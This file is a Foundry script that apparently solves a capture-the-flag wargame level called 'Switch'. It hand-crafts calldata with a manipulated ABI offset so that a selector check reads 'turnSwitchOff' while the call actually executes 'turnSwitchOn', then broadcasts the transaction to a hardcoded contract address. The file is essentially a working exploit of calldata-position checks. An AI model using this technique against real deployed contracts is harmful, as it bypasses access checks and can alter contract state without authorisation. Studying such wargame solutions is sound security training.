// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Switch.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract SwitchSolution is Script {
    Switch public switchInstance = Switch(0x68387c235eDF575276DcdbEc8C5F013dfE178Cf8);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Player : ", vm.envAddress("MY_ADDRESS"));
        console.log("Before switch : ", switchInstance.switchOn());

        console.logBytes4(bytes4(switchInstance.offSelector()));
        
        bytes memory switchCalldata = abi.encodePacked(
            switchInstance.flipSwitch.selector, 
            abi.encode(96), 
            abi.encode(0x00), // 32
            abi.encode(switchInstance.offSelector()), // 32
            abi.encode(4), // 32
            abi.encodeWithSelector(switchInstance.turnSwitchOn.selector), // 32
            abi.encode(0x00) // 32
        );

        console.logBytes(switchCalldata);

        address(switchInstance).call(switchCalldata);

        console.log("After switch : ", switchInstance.switchOn());

        vm.stopBroadcast();
    }
}